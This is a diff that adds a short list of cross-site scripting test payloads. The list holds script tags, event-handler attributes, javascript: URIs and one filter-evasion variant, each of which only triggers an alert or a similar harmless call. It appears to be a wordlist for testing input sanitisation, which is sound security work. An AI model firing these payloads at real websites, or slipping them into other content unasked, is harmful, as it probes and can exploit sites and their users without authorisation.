@@ -1,0 +1,19 @@
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<img src="x" onerror="alert('XSS')">
+<img src=x oneonerrorrror=alert(1)>
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+<svg onload=alert(1)>
+javascript:alert(1)
+<body onload=alert(1)>
+<img src="javascript:alert('XSS')">
+<svg/onload=alert('XSS')>
+<input onfocus=alert(1) autofocus>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>console.log('XSS')</script>
